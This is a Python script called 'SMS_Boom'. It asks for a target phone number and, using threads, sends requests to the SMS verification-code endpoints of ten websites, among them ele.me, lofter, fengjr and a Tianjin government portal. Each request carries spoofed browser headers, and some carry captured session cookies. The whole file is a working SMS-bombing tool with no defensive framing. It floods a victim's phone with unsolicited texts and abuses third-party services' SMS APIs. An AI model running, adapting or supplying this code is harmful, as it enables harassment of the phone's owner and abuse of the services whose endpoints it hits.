import requests, time, json, threading

phone = input('input the phone:')
url = []
data = []
header = []

# --------------------------------------
data1 = {
    'action': 'auth',
    'step': '1',
    'mobile': phone}

header1 = {
    'Referer': 'http://bbs.mydigit.cn/registe.php',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
}
url1 = 'http://bbs.mydigit.cn/registe.php?nowtime=' + str(int(time.time() * 1000)) + '&verify=ae064c93'

# --------------------------------------
data2 = {
    'MOBILENO': phone,
    'TEMP': 1
}
header2 = {
    'Referer': 'http://qydj.scjg.tj.gov.cn/reportOnlineService/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
}
url2 = 'http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login'

# --------------------------------------
url_get3 = 'http://www.yifatong.com/Customers/getsms?rnd='
header3 = {
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Referer': 'http://www.yifatong.com/Lawyers/register'
}

url3 = url_get3 + ("%0.3f" % time.time()) + "&mobile=" + phone
data3 = ' '

# --------------------------------------
data4 = json.dumps({
    "mobile": phone,
    "captcha_value": "",
    "captcha_hash": ""})
header4 = {
    'Referer': 'https://h5.ele.me/login/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
}
url4 = 'https://h5.ele.me/restapi/eus/login/mobile_send_code'

# --------------------------------------
data5 = {
    'action': 'register_code',
    'mobile': phone,
    'smstype': '0'
}
header5 = {
    'Host': 'www.hongniang.com',
    'Connection': 'keep-alive',
    'Content-Length': '49',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Origin': 'http://www.hongniang.com',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'http://www.hongniang.com/account/register_new1/from/index',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-TW,zh;q=0.9',
    'Cookie': 'Hm_lvt_13345a0835e13dfae20053e4d44560b9=1539753859,1539764530,1539765622,1539785564; Hm_lpvt_13345a0835e13dfae20053e4d44560b9=1539785564; PHPSESSID=p36jqoh0cb6vv0tarrv1mv0ls6; CwCzwf_baseInfo=think%3A%7B%22sex%22%3A%221%22%2C%22year%22%3A%221985%22%2C%22month%22%3A%221%22%2C%22day%22%3A%221%22%2C%22workProvince%22%3A%22-1%22%2C%22workCity%22%3A%22-1%22%2C%22workDict%22%3A%22-1%22%2C%22marriage%22%3A%221%22%7D'
}
url5 = 'http://www.hongniang.com/ajax/send_sms_code'

# ----------------------------------------
data6 = json.dumps({
    "phone": phone,
    "type": "1",
})

header6 = {
    'Content-Type': 'application/json',
    'Referer': 'http://www.sparke.cn/user/register',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
}
url6 = 'http://api.sparke.cn/v3/base/sms'

# ----------------------------------------
url7 = "http://www.028jiajiao.com/home/member/code.shtml"

header7 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Referer': 'http://www.028jiajiao.com/member/join.shtml'
}
data7 = {
    'mobile': phone,
    'type': 'join'
}

# ----------------------------------------
data8 = {
    'service': 'zymk',
    'imgCode': '',
    'refresh': '0',
    'mobile': phone
}
header8 = {
    'Referer': 'https://www.zymk.cn/login.htm',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
}
url8 = 'https://www.zymk.cn/sendsms/'

# ----------------------------------------
url9 = 'https://www.lofter.com/lpt/getCaptcha.do?clientType=0&deviceType=pc&phone=' + phone + '&callback=loft.m.register.g.jsonpgetCaptcha'
header9 = {
    'Host': 'www.lofter.com', 'Connection': 'keep-alive',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': '*/*',
    'Referer': 'http://www.lofter.com/phoneAccount/register',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-TW,zh;q=0.9',
    'Cookie': 'firstentry=%2FphoneAccount.do%3Fop%3Dregister%26X-From-ISP%3D2|; usertrack=ezq0pFvHNisnwvDtChUlAg==; JSESSIONID-WLF-XXD=19aaad835979f4c067f2f4b34933fc725b2321583a821c66b0d3132c3ee6139fc1a94deaadea4d03b1fd090edc6a64292df7d2cd926f8e8fbcd5b55877b5c758942589f8d365c1035e731843de1fc9019c7beeb27c5d655e2a9926cf2463e92e0b591ceba70f7a318c216a9bd37ca638c1a6a8a3f0c5cf2401834216e9424d164e23bea0; _ga=GA1.2.746225178.1539782189; _gid=GA1.2.1145748234.1539782189; __utma=61349937.746225178.1539782189.1539782189.1539782189.1; __utmc=61349937; __utmz=61349937.1539782189.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ntes_nnid=3ba5176bd3ecc7d189f54dfd98042658,1539782189894; NTESwebSI=0A0E0504FC0C68795AC9712E3A2E5BD3.hzabj-lofter-new14.server.163.org-8010; _gat=1; __utmb=61349937.2.10.1539782189'

}
data9 = ' '

# ---------------------------------------
data10 = {
    'version': '1.0',
    'mobile': phone,
}
header10 = {
    'Host': 'www.fengjr.com',
    'Connection': 'keep-alive',
    'Content-Length': '30',
    'Accept': '*/*',
    'Origin': 'https://www.fengjr.com',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Referer': 'https://www.fengjr.com/cn/act/201804-pc-TY1888.html?f=s0&c=1bl05jjjq-1&channel=1bl05jjjq-1',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-TW,zh;q=0.9',
    'Cookie': 'CPS_1bl05jjjq-1_200289_534=t%3D1539780615700%26cu%3Dnocu%26mk%3Dnomk%7C%7Cfa.sogou.com%2F%26mt%3D0; _fjrclflag=1; fjr_channel_code=1bl05jjjq-1; JSESSIONID=94BCD9FE0484AA8A77EBE3F94D2B8AAD; __jsluid=04b8e9f045af57023db22cb052c22257; _ga=GA1.2.22042392.1539780616; _gid=GA1.2.305837834.1539780616; _gat=1; Qs_lvt_185296=1539780617; Qs_pv_185296=3726714589536066000; fjr_channel=1bl05jjjq-1; fjr_channel_date=1539780617304; fjr_ad_channel=1bl05jjjq-1; fjr_ad_channel_date=1539780617305; fjr_did=f0597b26-f336-40c0-8944-152f1825c8ad; fjr_vts=1; _fjrvts=1; fjr_fst=1539780617307; fjr_lst=1539780617307; fjr_vct=1539780617307; fjr_sqn=1; fjr_internal_ip=192.168.1.119; Hm_lvt_cca0837a014621d8d933a0b1b2cb0be5=1539780617; Hm_lpvt_cca0837a014621d8d933a0b1b2cb0be5=1539780617; first_ad_channel=1bl05jjjq-1; first_ad_date=1539780617956; current_ad_channel=1bl05jjjq-1; current_ad_date=1539780617956; aclt=1539780617304; acl=1bl05jjjq-1; aclc=1bl05jjjq-1'
}
url10 = 'https://www.fengjr.com/api/v2/user/loginRegister/captcha/text'

url.append(url1)
url.append(url2)
url.append(url3)
url.append(url4)
url.append(url5)
url.append(url6)
url.append(url7)
url.append(url8)
url.append(url9)
url.append(url10)

data.append(data1)
data.append(data2)
data.append(data3)
data.append(data4)
data.append(data5)
data.append(data6)
data.append(data7)
data.append(data8)
data.append(data9)
data.append(data10)

header.append(header1)
header.append(header2)
header.append(header3)
header.append(header4)
header.append(header5)
header.append(header6)
header.append(header7)
header.append(header8)
header.append(header9)
header.append(header10)


class SMS_Boom(threading.Thread):
    def __init__(self, url, header, data, i):
        super().__init__()
        self.url = url
        self.header = header
        self.data = data
        self.i = i

    def run(self):
        try:
            if self.i == 2 or self.i == 8:
                res1 = requests.get(url=self.url, headers=self.header)
                print(res1.text)
                print('Success!')
            else:
                res2 = requests.post(url=self.url, data=self.data, headers=self.header)
                print(res2.text)
                print('Success!')
        except Exception:
            print('failed')


if __name__ == '__main__':
    threads = []
    for i in range(len(url)):
        BM = SMS_Boom(url[i], header[i], data[i], i)
        BM.setDaemon(True)
        threads.append(BM)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print('Done!')
